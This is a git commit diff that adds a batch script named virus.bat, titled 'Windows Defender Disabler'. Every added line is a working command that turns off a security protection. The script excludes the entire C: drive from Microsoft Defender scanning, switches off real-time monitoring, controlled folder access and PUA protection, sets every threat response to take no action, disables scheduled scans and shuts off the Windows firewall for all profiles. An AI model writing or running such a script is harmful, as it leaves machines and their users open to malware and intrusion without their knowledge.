583909f4da3c4761ff5324451a8deed850ac88df
Purple Professional <97543454+PurpleProfessional@users.noreply.github.com>
2022-02-11 14:07:48 -0500

    Update virus.bat

--- virus.bat
+++ virus.bat
@@ -1,1 +1,20 @@
 @echo off
+title Windows Defender Disabler
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "C:"
+powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring"
+powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
+
+powershell.exe -command "Set-MpPreference -PUAProtection disable"
+
+powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
+powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
+      
+powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"
+
+powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
+
+powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
+
+powershell.exe -command "netsh advfirewall set allprofiles state off"
+echo Windows Defender Disabled!
+pause >nul
